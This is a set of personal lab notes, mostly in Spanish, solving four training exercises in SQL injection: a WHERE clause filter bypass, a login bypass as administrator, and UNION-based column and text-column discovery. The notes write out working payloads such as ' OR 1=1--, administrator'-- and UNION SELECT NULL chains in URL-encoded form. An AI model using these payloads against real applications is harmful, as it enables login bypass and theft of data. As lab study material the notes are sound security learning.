# know sql inyection laboratories

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

### solucion

Hacemos las pruebas iniciales

```bash
‘

‘--

' OR 1=1 --   


```
Inicialmente hay una serie de pruebas que hacen que puedas ver si va a ser o no vulnerable.

Hay algunas que dan invalid results y otras no dan fallo de inyección pero no hace nada nuevo. Por este motivo es susceptible de sql inyection así que probamos más cosas.

en este caso la solución es que rellenar los espacios por + , pero es que también podemos usar el espacio como si fuese %20 y también funciona. 

```bash
## Opcion1
%27%20OR%201=1--

## Opcion2 
'+OR+1=1--
```

![](2022-07-06-11-37-17.png)

## Lab: SQL injection vulnerability allowing login bypass

This lab contains an SQL injection vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.

Se soluciona poniendo administrator'-- y en el password ''

![](2022-07-06-11-54-04.png)

## Lab: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.

Este tipo de laboratorios son muy fáciles y ni siquiera entro en burpsuite , no tiene mucho sentido para añadir simplemente lo que te acaban de decir en el temario de la academia. 

Lo que hay que hacer es saber que opciones hay para obtener el número de columnas. Haber en principio hay 2 :

    1º es usando el ' ORDER BY 1-- . Aquí se va aumentando el número para ver el número de columnas

    2º ' UNION SELECT NULL-- e ir añadiendo NULL

En el enunciado del laboratorio aparece que usemos el NULL... porque co la primera opción vale pero no resuelve el laboratorio.

En este caso los espacios nos lo da como malos , así que usamos el + para los espacios.

```bash
filter?category=Accessories%27+UNION+SELECT+NULL,NULL,NULL--
```


## Lab: SQL injection UNION attack, finding a column containing text

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

Una vez que sabemos por el laboratorio anterior que el número de columnas es 3 , podemos permutar para ver los erres.

```bash
' UNION SELECT 'QhDKgq',NULL,NULL--
' UNION SELECT NULL,'QhDKgq',NULL--   --> no da error
' UNION SELECT NULL,NULL,'QhDKgq'--
```

```bash
'+UNION+SELECT+'QhDKgq',NULL,NULL--
'+UNION+SELECT+NULL,'QhDKgq',NULL--   --> no da error
'+UNION+SELECT+NULL,NULL,'QhDKgq'--
```
Seguramente hará falta poner el + en los espacios. 



Make the database retrieve the string: 'QhDKgq'

```bash
/filter?category=Accessories'+UNION+SELECT+NULL,'QhDKgq',NULL--   --> y solved
```

![](2022-07-06-14-07-42.png)

![](2022-07-06-14-08-03.png)